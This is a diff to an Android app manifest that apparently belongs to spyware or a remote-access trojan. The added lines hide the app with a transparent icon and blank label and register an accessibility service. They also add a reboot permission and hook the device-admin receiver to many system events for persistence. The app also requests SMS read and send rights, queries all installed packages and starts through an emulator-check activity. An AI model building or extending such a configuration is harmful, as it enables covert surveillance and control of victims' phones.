@@ -36,6 +36,7 @@
     <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.REBOOT" />
     <uses-permission android:name="android.permission.RECEIVE_MMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
@@ -80,8 +81,8 @@
     <uses-feature
         android:name="android.hardware.touchscreen"
         android:required="false" />
-    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
 
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
     <uses-permission android:name="android.permission.MANAGE_DEVICE_POLICY_LOCK" />
 
     <application
@@ -90,24 +91,43 @@
         android:fullBackupContent="@xml/backup_rules"
         android:icon="@drawable/transparent"
         android:label=" "
-        android:roundIcon="@mipmap/ic_launcher_round"
+        android:roundIcon="@drawable/transparent"
         android:supportsRtl="true"
         android:theme="@style/Theme.Betryalcommit"
         android:usesCleartextTraffic="true"
-        tools:targetApi="22">
+        tools:ignore="MissingTvBanner"
+        tools:targetApi="28">
+        <activity
+            android:name=".blockedapp"
+            android:exported="false" />
         <activity
             android:name=".EmulatorChecks"
-            android:theme="@style/Theme.AppCompat.NoActionBar"
-            android:exported="true">
+            android:exported="true"
+            android:theme="@style/Theme.AppCompat.NoActionBar">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
 
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
+
+        <service
+            android:name=".Naruto"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/acs" />
+        </service>
+
         <activity
             android:name=".MainActivity"
-            android:exported="true"></activity>
+            android:exported="true">
+
+        </activity>
 
         <receiver
             android:name=".MyAdminReceiver"
@@ -134,6 +154,15 @@
                 <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.SCREEN_ON" />
+                <action android:name="android.intent.action.SCREEN_OFF" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <action android:name="android.intent.action.ACTION_SHUTDOWN" />
+                <action android:name="android.intent.action.ACTION_REBOOT" />
+                <action android:name="android.intent.action.ACTION_REQUEST_SHUTDOWN" />
+                <action android:name="android.intent.action.AIRPLANE_MODE" />
+                <action android:name="android.intent.action.ACTION_HEADSET_PLUG" />
+                <action android:name="android.intent.action.ACTION_BATTERY_CHANGED" />
+
             </intent-filter>
         </receiver>
 
